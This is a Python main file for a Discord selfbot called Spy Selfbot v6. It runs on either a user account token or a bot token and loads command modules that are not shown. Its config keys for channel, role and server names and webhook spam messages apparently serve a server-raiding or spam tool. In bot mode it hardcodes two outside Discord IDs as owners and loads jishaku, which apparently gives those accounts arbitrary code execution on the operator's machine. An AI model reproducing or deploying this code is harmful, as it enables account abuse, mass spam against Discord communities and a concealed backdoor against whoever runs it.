import os
import discord
from discord.ext import commands
import json 
import httpx
import random
import pypresence 
import requests
import datetime
from colorama import Fore
import asyncio 
import sys
import threading
import json
import aiohttp
from aiohttp import request
import time
import sys
from pypresence import Presence
import io
import contextlib
import textwrap
with open("./config/config.json","r") as conf:
    data = json.load(conf)
    
    SpyEncrypt = data["Token"]
    SpyEncrypt1 = data["Prefix"]
    SpyEncrypt2 = data["AllowedUsers"]
    SpyEncrypt3 = data["Password"]
    SpyEncrypt4 = data["ChannelNames"]
    SpyEncrypt5 = data["RoleNames"]
    SpyEncrypt6 = data["ServerNames"]
    SpyEncrypt7 = data["WebhookSpamMessages"]
    
def check_token():
    if requests.get("https://discord.com/api/v9/users/@me",headers={"Authorization":SpyEncrypt}).status_code == 200:
        return "user"
    else:
        return "bot"
    
token_type = check_token()
intents = discord.Intents.all()
if token_type == "user":
    headers = {"Authorization":SpyEncrypt}
    client = commands.Bot(command_prefix=SpyEncrypt1, help_command=None, self_bot=True,intents=intents)
else:
    headers = {"Authorization":f"Bot {SpyEncrypt}"}
    client = commands.Bot(command_prefix=SpyEncrypt1, intents=intents, help_command=None,owner_ids=[919463728536236102,930320419314090025])
@client.listen()
async def on_ready():
    print(f"""
    
   ▄████████    ▄███████▄ ▄██   ▄           ▄████████    ▄████████  ▄█          ▄████████ ▀█████████▄   ▄██████▄      ███     
  ███    ███   ███    ███ ███   ██▄        ███    ███   ███    ███ ███         ███    ███   ███    ███ ███    ███ ▀█████████▄ 
  ███    █▀    ███    ███ ███▄▄▄███        ███    █▀    ███    █▀  ███         ███    █▀    ███    ███ ███    ███    ▀███▀▀██ 
  ███          ███    ███ ▀▀▀▀▀▀███        ███         ▄███▄▄▄     ███        ▄███▄▄▄      ▄███▄▄▄██▀  ███    ███     ███   ▀ 
▀███████████ ▀█████████▀  ▄██   ███      ▀███████████ ▀▀███▀▀▀     ███       ▀▀███▀▀▀     ▀▀███▀▀▀██▄  ███    ███     ███     
         ███   ███        ███   ███               ███   ███    █▄  ███         ███          ███    ██▄ ███    ███     ███     
   ▄█    ███   ███        ███   ███         ▄█    ███   ███    ███ ███▌    ▄   ███          ███    ███ ███    ███     ███     
 ▄████████▀   ▄████▀       ▀█████▀        ▄████████▀    ██████████ █████▄▄██   ███        ▄█████████▀   ▀██████▀     ▄████▀   
                                                                   ▀                                                          

            - https://github.com/DraKenCodeZ/spy-sb-v6
            
    ・Logged in as {client.user}
    ・Type {SpyEncrypt1}help to get list of all the commands.
    ・Created by Team SPY™
    ・https://discord.gg/gamer""")    


for file in os.listdir("./cogs"):
	if file.endswith(".py"):
		client.load_extension(f"cogs.{file[:-3]}")
client.load_extension("jishaku")
if token_type == "user":
    client.run(SpyEncrypt, bot=False)
else:
    client.run(SpyEncrypt)
